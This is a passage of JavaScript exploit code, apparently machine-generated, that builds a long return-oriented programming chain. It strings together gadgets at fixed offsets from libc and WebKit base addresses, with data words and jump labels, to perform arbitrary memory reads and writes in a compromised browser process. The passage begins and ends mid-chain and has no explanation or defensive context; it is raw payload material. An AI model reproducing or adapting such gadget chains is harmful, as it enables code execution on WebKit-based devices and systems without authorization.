db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2146:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L2148:
db([312, 0]); // 0x138
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2149:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+149104, //L2153-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+149088, //L2152-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2152:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2153:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+149272, //L2156-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+149288, //L2157-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+149240, //L2154-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+149256, //L2155-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2154:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2155:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2156:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2157:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+149384, //L2159-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+149368, //L2158-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2158:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2159:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2160:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2161:
db([1, 0]); // 0x1
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+149600, //L2163-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+149616, //L2164-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+149584, //L2162-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2162:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2163:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2164:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+149720, //L2167-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+149736, //L2168-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2165:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L2167:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2168:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2169:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+149880, //L2173-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+149864, //L2172-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2172:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2173:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+150048, //L2176-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+150064, //L2177-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+150016, //L2174-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+150032, //L2175-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2174:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2175:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2176:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2177:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+150160, //L2179-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+150144, //L2178-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2178:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2179:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2180:
db([15, 0]); // 0xf
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+150272, //L2183-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2183:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+85173, //or rax, rcx
libc_base+362222, //pop rsi
ropchain+150416, //L2185-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+150432, //L2186-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+150400, //L2184-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2184:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2185:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2186:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+150536, //L2189-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+150552, //L2190-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2187:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L2189:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2190:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2191:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+150696, //L2195-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+150680, //L2194-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2194:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2195:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+150864, //L2198-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+150880, //L2199-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+150832, //L2196-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+150848, //L2197-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2196:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2197:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2198:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2199:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+150976, //L2201-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+150960, //L2200-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2200:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2201:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2202:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L2203:
db([1, 0]); // 0x1
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+151192, //L2205-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+151208, //L2206-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+151176, //L2204-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2204:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2205:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2206:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+151312, //L2209-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+151328, //L2210-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2207:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L2209:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2211:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L2213:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+151488, //L2216-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+151472, //L2215-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2215:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2216:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+151632, //L2219-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+151600, //L2217-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+151616, //L2218-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2217:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2218:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2219:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+151704, //L2220-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2220:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+151760, //L2223-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2223:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+151856, //L2226-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2224:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L2226:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+151960, //L2229-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+151944, //L2228-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2228:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2229:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+152128, //L2232-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+152144, //L2233-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+152096, //L2230-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+152112, //L2231-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2230:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2231:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2232:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2233:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+152248, //L2234-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+152280, //L2236-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+152264, //L2235-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2234:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2235:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2236:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+152368, //L2237-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+152424, //L2240-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2240:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+152512, //L2243-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2241:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L2243:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2244:
db([40, 0]); // 0x28
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+152656, //L2248-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+152640, //L2247-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2247:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2248:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+152800, //L2251-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+152768, //L2249-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+152784, //L2250-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2249:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2250:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2251:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+152896, //L2254-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2252:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L2254:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+153000, //L2257-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+152984, //L2256-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2256:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2257:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+153144, //L2260-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+153112, //L2258-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+153128, //L2259-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2258:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2259:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2260:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+153216, //L2261-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2261:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+153272, //L2264-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2264:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+153368, //L2267-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2265:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L2267:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+153472, //L2270-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+153456, //L2269-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2269:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2270:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+153640, //L2273-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+153656, //L2274-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+153608, //L2271-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+153624, //L2272-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2271:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2272:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2273:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2274:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+153760, //L2275-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+153792, //L2277-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+153776, //L2276-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2275:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2276:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+153880, //L2278-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+153936, //L2281-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2281:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+154032, //L2282-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+154088, //L2285-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2285:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+757614 //pop rcx
]);
//L2286:
db([16, 0]); // 0x10
set_gadget(libc_base+467092,); //pop rax
//L2287:
db([16, 0]); // 0x10
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+154240, //L2288-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2288:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+154296, //L2291-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2291:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+154416, //L2294-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2292:
db([32, 0]); // 0x20
set_gadget(libc_base+757614,); //pop rcx
//L2294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+154520, //L2297-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+154504, //L2296-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2296:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2297:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+154664, //L2300-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+154632, //L2298-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+154648, //L2299-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2298:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2299:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2300:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+154760, //L2303-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2301:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+757614,); //pop rcx
//L2303:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+154864, //L2306-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
